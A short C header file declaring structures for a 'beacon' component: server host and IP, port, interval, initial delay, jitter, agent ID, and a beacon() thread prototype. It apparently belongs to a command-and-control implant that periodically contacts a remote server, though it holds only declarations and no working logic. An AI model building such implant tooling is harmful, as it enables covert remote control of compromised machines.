#ifndef __INCLUDE_BEACON_H__
#define __INCLUDE_BEACON_H__

#include <pthread.h>

struct packet_struct;
typedef struct _BEACON_INFO
{
	char *host; // Domain name  or IP address of beacon server
	char *ip;	// Resolved IP address of beacon server
	int port;
	int interval;			// Beacon interval (seconds)
	unsigned int initDelay; // Initial beacon delay (seconds)
	unsigned int jitter;	// jitter in percent (0-100)
	unsigned int agentID;
	struct packet_struct *packets;
	pthread_mutex_t packets_mutex;
	int argc;
	char **argv;
	char **env;
} BEACONINFO;

struct cl_args
{
	char beacon_ip[256]; // Domain name or IP address of beacon server
	int port;
	int interval;
	unsigned int initDelay;
	unsigned int jitter; //(0-100)
	unsigned int agentID;
};

void *beacon(BEACONINFO *beaconInfo);

#endif